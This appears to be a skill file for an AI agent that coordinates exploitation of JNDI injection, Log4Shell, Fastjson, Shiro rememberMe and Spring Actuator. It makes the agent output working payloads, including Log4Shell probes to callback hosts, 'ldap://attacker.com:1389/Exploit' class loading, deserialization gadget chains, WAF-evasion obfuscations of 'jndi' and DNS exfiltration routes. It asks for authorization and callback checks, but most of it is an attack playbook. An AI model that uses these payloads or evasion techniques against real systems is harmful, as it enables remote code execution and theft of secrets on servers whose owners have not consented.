---
name: s-jndi
description: Unified JNDI Injection and Java Framework Exploitation skill linking hack-skills methodology with AboutSecurity execution resources. Covers JNDI/LDAP/RMI injection, Log4Shell (CVE-2021-44228), Fastjson/Jackson deserialization, Shiro rememberMe RCE, and Spring framework attacks.
---

# Unified JNDI Injection / Java Framework Exploitation

## When To Use

Use for JNDI injection exploitation (LDAP/RMI/DNS), Log4Shell (Log4j JNDI lookup), Fastjson autotype deserialization, Shiro rememberMe cookie deserialization, Spring Cloud Gateway/Actuator RCE, and Jackson polymorphic deserialization attacks.

## Source Priority

| Task Type | Primary Source |
|---|---|
| Methodology | hack-skills |
| Execution | AboutSecurity |
| Ctf | AboutSecurity |
| Bug Bounty | hack-skills |
| Resources | AboutSecurity |

## Source Strategy

- Use hack-skills for methodology, scenario classification, domain coverage and deeper playbooks.
- Use AboutSecurity for execution constraints, mandatory rules, payload files, dictionaries, tool YAML configs, CTF and K8s fine-grained resources.
- Do not duplicate upstream content here. Load upstream files when needed.

## Recommended Loading Order

### High-Level Analysis

1. Read matched hack-skills files first unless Source Priority says otherwise.
2. Then read matched AboutSecurity files for constraints and execution details.

### Execution

1. Read matched AboutSecurity skill files first.
2. Check related Tools YAML.
3. Check related Payload/Dic/Doc files.
4. Fall back to hack-skills for scenario variants and methodology.

### CTF

1. Prefer AboutSecurity when this topic has matching AboutSecurity skills/resources.
2. Use hack-skills for broader theory or missing coverage.

### Bug Bounty / Authorized Assessment

1. Prefer hack-skills methodology and scenario files.
2. Use AboutSecurity tools/resources for execution support.

## Conflict Resolution

1. Safety and authorization rules always have highest priority.
2. AboutSecurity `NEVER`, `ALWAYS`, `禁止`, `必须`, `⛔` rules override general methodology during execution.
3. hack-skills is preferred for scenario classification, knowledge depth and real-world methodology.
4. AboutSecurity is preferred for tools, payloads, dictionaries, CTF and automated execution constraints.
5. For CTF tasks, prefer AboutSecurity unless this topic is mainly covered by hack-skills.
6. For bug bounty or authorized assessment, prefer hack-skills for strategy and AboutSecurity for resources.

## Matched hack-skills Skills

- `../../security-sources/hack-skills/skills/jndi-injection/SKILL.md` — SKILL: JNDI Injection — Expert Attack Playbook

## Matched AboutSecurity Skills

- `../../security-sources/AboutSecurity/skills/exploit/web-method/java-deserialization-methodology/SKILL.md` — Java 反序列化漏洞方法论
- `../../security-sources/AboutSecurity/skills/code-audit/java/java-framework-audit/SKILL.md` — Java 框架源码审计
- `../../security-sources/AboutSecurity/skills/code-audit/java/java-exploit-chain/SKILL.md` — Java 漏洞利用链构建

## Related AboutSecurity Tools

- No match found.

## Related AboutSecurity Payloads

- `../../security-sources/AboutSecurity/Payload/rce/unix.txt`

## Related AboutSecurity Dictionaries

- No match found.

## Related AboutSecurity Docs

- No match found.

## References

See `references/SOURCES.md`.

## Vulnerability Testing Output Template

When you discover a potential JNDI injection or Java framework vulnerability and begin active testing, ⛔ **MUST** structure findings using this fixed 4-module output template.

### Module 1: 测试思路 (Testing Approach)
- Describe the injection context: user-controlled input reaching `InitialContext.lookup()`, Log4j logging of user input, Fastjson `parseObject()` with user data, Shiro cookie, or Jackson `enableDefaultTyping()` endpoint
- Classify the attack type: JNDI direct injection (`ldap://` `rmi://` `dns://`), Log4Shell (message lookup substitution `${jndi:ldap://}`), Fastjson autotype (`@type`), Shiro rememberMe (AES-CBC padding oracle + CommonsCollections), Spring Cloud Gateway Actuator RCE
- Fingerprint the framework version: Log4j 2.x (< 2.17.1), Fastjson (< 1.2.83), Shiro (< 1.10.0), Spring Boot Actuator endpoints, Java version (critical for JNDI remote class loading ≥ 8u191 restrictions)
- Document the decision tree: injection point identification → protocol/version fingerprinting → Java version check (trustURLCodebase) → bypass strategy selection → callback verification → escalation
- State expected success indicator: DNS/LDAP callback received, RCE confirmed via reverse shell/dnslog

### Module 0: 防护探测 filter_probe（⛔ 必须先于 payload）

在注入点插入 JNDI 协议探针：
- `${jndi:ldap://collaborator-id.oastify.com/a}` — Log4j 探测
- `ldap://collaborator-id.oastify.com/a` — 直接 JNDI 探测
- `rmi://collaborator-id.oastify.com/a` — RMI 协议变体
- `dns://collaborator-id.oastify.com` — DNS 协议变体（无回显时使用）
- `{"@type":"java.net.InetAddress","val":"collaborator-id.oastify.com"}` — Fastjson 探测

每个单独测试，记入 `{操作: [防护情况, 是否回调, 说明]}`。
防护情况枚举：`放行` / `过滤` / `替换` / `拦截` / `转义`。

**禁止**在未确认回调前启动 LDAP/RMI 服务发送恶意 class。

> 编号化测试要点见 `../pentest-windftsy/references/test-checkpoints.md` — **JNDI001~003**。
> ⛔ Java 版本 ≥ 8u191 时 `trustURLCodebase` 默认 false → 无法直接远程加载 class，必须改用反序列化 gadget 或本地 classpath 类。

### Module 2: 关键技巧 (Key Techniques)
- List 2-4 non-obvious technical details:
  - **JDK version bypass for JNDI**: Java ≥ 8u191 disabled remote codebase loading — but you can still use `javaSerializedData` LDAP attribute referencing a local gadget class with ysoserial payload; no remote class loading needed
  - **Log4Shell obfuscation**: `${${lower:j}ndi:ldap://...}` `${${::-j}${::-n}${::-d}${::-i}}` `${jndi:${lower:l}${lower:d}ap://...}` — Log4j's nested lookup resolution enables extensive keyword obfuscation to bypass WAF
  - **Fastjson autotype expectedClass bypass**: Fastjson 1.2.68+ restricts `@type` but allows it when the type is assignable to an expected class — chain through `AutoCloseable` / `Readable` interfaces to reach dangerous classes
  - **Shiro rememberMe dual-chain**: Shiro uses `AES/CBC/PKCS5Padding` — if padding oracle is exploitable, combine with `CommonsBeanutils` (no `commons-collections` needed) for broader target coverage than CommonsCollections chains

### Module 3: Payload字典 (Payload Dictionary)
- ⛔ Provide minimum 3 payloads organized by scenario:
  1. **Log4Shell probe**: `${jndi:ldap://xxx.dnslog.cn/a}` in each logged field (User-Agent, X-Forwarded-For, username, search query, etc.)
  2. **Log4Shell RCE (JDK < 8u191)**: `ldap://attacker.com:1389/Exploit` referencing a malicious Java class
  3. **Log4Shell RCE (JDK ≥ 8u191)**: LDAP server returning `javaSerializedData` with CommonsCollections gadget, or `javaFactory` pointing to `org.apache.naming.factory.BeanFactory` + EL injection
- Each entry format: `[Framework/Version Range] <payload>` → expected behavior

### Module 4: 绕过方法 (Bypass Methods)
- Anticipate defensive measures and provide counter-strategies:
  1. **WAF keyword bypass (Log4Shell)**: `jndi` → `${::-j}ndi` / `j${upper:n}di` / `jn${env:USER:-d}i`; `ldap` → `${lower:L}dap` / `l${::-d}ap`; additionally: URL encode parts, use `jndi:dns://` for blind detection
  2. **Outbound connection blocking**: when LDAP/RMI outbound is firewalled, use `jndi:dns://` for DNS-only exfiltration; if DNS also blocked, `jndi:ldap://127.0.0.1:1389/` if attacker has SSRF to internal service
  3. **Log4j 2.17.0+ partial bypass**: Log4j 2.17.0 removed JNDI but retained `${env:...}` lookups — chain environment variable leak + SSRF to exfiltrate secrets without RCE
  4. **Fastjson `autoTypeCheck` bypass**: use `JSON.parseObject()` with `Feature.SupportNonPublicField`, or exploit nested JSON `{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;...\"}` with semicolon namespace notation

## Important Agent Rules

- Do not treat this bridge file as the full knowledge source.
- Always load the matched upstream files needed for the task.
- Preserve and obey upstream mandatory execution rules.
- ⛔ JNDI injection can lead to RCE. Verify with DNS callbacks first; deploy LDAP/RMI server only after confirming lookup.
- ⛔ Shiro rememberMe exploitation requires AES key — only attempt with known/default keys or in authorized CTF environments.
- Only operate in authorized environments.
